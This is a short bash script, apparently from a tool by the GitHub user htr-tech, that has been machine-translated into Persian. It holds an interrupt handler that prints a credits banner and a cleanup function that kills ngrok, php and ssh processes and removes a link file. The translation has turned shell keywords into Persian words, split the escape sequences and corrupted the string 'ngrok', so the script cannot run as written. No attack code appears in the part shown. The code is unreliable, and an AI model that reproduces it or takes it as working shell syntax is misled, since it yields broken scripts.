#!/bin/bash

دام 'printf "\ n" ؛ توقف ؛ خروج 1' 2
تله user_interrupt SIGINT
SIGTSTP user_interrupt را به دام بیندازید

user_interrupt () {
        printf "\ e [0m \ n"
        printf "\ e [0m \ e [1؛ 36m \ t CTRL + C فشرده !! \ n"
        خوابیدن 2
        printf "\ e [0m \ n"
        printf "\ e [0m \ e [1؛ 42m با تشکر از استفاده از این ابزار !! \ e [0m \ e [1؛ 44m برای کسب اطلاعات بیشتر \ e [0m \ n" از https://github.com/htr-tech دیدن کنید
        printf "\ e [0m \ n"
        خروج 1
}

متوقف کردن() {

checkngrok = $ (ps aux | grep -o "ngrok" | head -n1)
checkphp = $ (ps aux | grep -o "php" | head -n1)
checkssh = $ (ps aux | grep -o "ssh" | head -n1)
اگر [[$ checkngrok == * 'گرمk' *]] ؛ سپس
pkill -f -2 ngrok> /dev /null 2> & 1
killall ngrok> /dev /null 2> & 1
fi
اگر [[$ checkphp == * 'php' *]] ؛ سپس
pkill -f -2 php> /dev /null 2> & 1
killall php> /dev /null 2> & 1
fi
اگر [[$ checkssh == * 'ssh' *]] ؛ سپس
pkill -f -2 ssh> /dev /null 2> & 1
killall ssh> /dev /null 2> & 1
fi
اگر [[-e. پیوند]] ؛ سپس
rm -rf. پیوند
fi

}

